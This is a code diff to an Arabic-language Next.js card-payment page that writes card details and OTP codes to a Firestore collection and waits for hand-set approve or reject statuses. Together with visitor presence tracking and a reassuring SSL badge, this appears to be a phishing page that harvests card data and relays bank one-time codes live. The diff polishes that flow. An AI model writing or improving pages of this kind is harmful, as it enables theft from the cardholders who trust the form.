@@ -8,6 +8,7 @@ import { FullPageLoader } from "./loader"
 import { doc, onSnapshot } from "firebase/firestore"
 import { db } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
+import { LockIcon } from "lucide-react"
 
 interface CardData {
   number: string
@@ -68,7 +69,6 @@ const validateCVV = (cvv: string, cardType: string): boolean => {
 
 const allOtps = [""]
 
-
 export default function AddCard() {
   const searchParams = useSearchParams()
   const id = searchParams.get("id")
@@ -88,33 +88,78 @@ export default function AddCard() {
   const [fieldErrors, setFieldErrors] = useState<Partial<Record<keyof CardData, string>>>({})
 
   useEffect(() => {
-    const visitorId = localStorage.getItem("visitor")||id
-    if (visitorId) {
-      setupOnlineStatus(visitorId)
-      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
-        if (docSnap.exists()) {
-          const data = docSnap.data()
-          if (data.status===undefined){
-            setLoading(false)
+    const visitorId = id
+    if (!visitorId) {
+      setLoading(false)
+      return
+    }
 
-          }else
-          if (data.status === "pending") {
+    setupOnlineStatus(visitorId)
+
+    const unsubscribe = onSnapshot(
+      doc(db, "pays", visitorId),
+      (docSnap) => {
+        if (!docSnap.exists()) {
+          setLoading(false)
+          return
+        }
+
+        const data = docSnap.data()
+
+        if (!data?.status) {
+          setLoading(false)
+          return
+        }
+
+        switch (data.status) {
+          case "pending":
             setLoading(true)
             setError("")
-          } else if (data.status === "approved" &&step==="form") {
+            break
+
+          case "approved":
             setLoading(false)
-            setStep("otp")
             setError("")
-          } else if (data.status === "rejected") {
+            if (step === "form") {
+              setStep("otp")
+            }
+            break
+
+          case "rejected":
             setLoading(false)
             setStep("form")
             setError("عذراً، تم رفض البطاقة. الرجاء التحقق من المعلومات والمحاولة مرة أخرى.")
-          }
+            break
+
+          case "otp_rejected":
+            setLoading(false)
+            setOtpSubmitted(false)
+            setStep("otp")
+            setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
+            setOtp("")
+            break
+
+          case "success":
+            setLoading(false)
+            setError("")
+            setStep("success")
+            break
+
+          default:
+            console.warn(`Unknown status: ${data.status}`)
+            setLoading(false)
+            break
         }
-      })
-      return () => unsubscribe()
-    }
-  }, [])
+      },
+      (error) => {
+        console.error("Firestore listener error:", error)
+        setLoading(false)
+        setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
+      },
+    )
+
+    return () => unsubscribe()
+  }, [id, step])
 
   const formatCardNumber = (v: string) =>
     v
@@ -183,10 +228,8 @@ export default function AddCard() {
       name: cardData.name,
       cardType: getCardType(cardData.number),
       createdDate: new Date().toISOString(),
-      status:"pending"
+      status: "pending",
     })
-
-    
   }
 
   const handleOtpSubmit = async (e: FormEvent) => {
@@ -271,10 +314,10 @@ export default function AddCard() {
       className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50/30 to-slate-50 flex items-center justify-center p-4"
       dir="rtl"
     >
-      {loading ||otpSubmitted && <FullPageLoader />}
+      {(loading || otpSubmitted) && <FullPageLoader />}
       <div className="w-full max-w-md bg-white rounded-2xl shadow-xl border border-slate-200/50 overflow-hidden">
         {/* Header Section */}
-        <div className="bg-gradient-to-r from-slate-800 via-teal-700 to-slate-800 px-6 py-8 relative overflow-hidden">
+        <div className="bg-gradient-to-r from-slate-900 via-teal-700 to-slate-800 px-6 py-8 relative overflow-hidden">
           <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -translate-y-16 translate-x-16"></div>
           <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/5 rounded-full translate-y-12 -translate-x-12"></div>
 
@@ -288,7 +331,7 @@ export default function AddCard() {
                   d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                 />
               </svg>
-              <h1 className="text-lg font-bold text-white">إضافة بطاقة ائتمانية</h1>
+              <h1 className="text-lg font-bold text-white">إتمام الدفع</h1>
             </div>
             <p className="text-slate-300 text-sm">
               {step === "form" && "جميع بياناتك محمية ومشفرة بالكامل"}
@@ -414,7 +457,7 @@ export default function AddCard() {
                         strokeLinecap="round"
                         strokeLinejoin="round"
                         strokeWidth={2}
-                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2z"
+                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2z"
                       />
                     </svg>
                     CVV
@@ -451,13 +494,7 @@ export default function AddCard() {
 
               <div className="space-y-3">
                 <div className="flex items-center justify-center gap-2 text-xs text-slate-500 bg-slate-50 py-2 px-3 rounded-lg border border-slate-200">
-                  <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
-                    <path
-                      fillRule="evenodd"
-                      d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 01-2-2z"
-                      clipRule="evenodd"
-                    />
-                  </svg>
+<LockIcon className="h-4 text-green-500"/>             
                   <span className="font-medium">معلوماتك محمية بتشفير SSL 256-bit</span>
                 </div>
 
@@ -530,26 +567,17 @@ export default function AddCard() {
             </form>
           )}
 
-          {/* Success Screen */}
           {step === "success" && (
-            <div className="text-center space-y-4 py-8">
-              <div className="flex justify-center">
-                <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center">
-                  <svg className="w-8 h-8 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
-                  </svg>
-                </div>
+            <div className="space-y-6 text-center py-8">
+              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
+                <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                </svg>
               </div>
               <div>
-                <h2 className="text-xl font-bold text-slate-900">تمت إضافة البطاقة بنجاح!</h2>
-                <p className="text-slate-600 text-sm mt-1">يمكنك الآن استخدام بطاقتك للدفع</p>
+                <h2 className="text-2xl font-bold text-slate-800 mb-2">تمت العملية بنجاح!</h2>
+                <p className="text-slate-600">تم التحقق من بطاقتك بنجاح</p>
               </div>
-              <Button
-                onClick={() => setStep("form")}
-                className="w-full py-3 bg-slate-100 text-slate-700 rounded-lg text-base font-semibold hover:bg-slate-200 transition-all duration-200"
-              >
-                إضافة بطاقة أخرى
-              </Button>
             </div>
           )}
         </div>
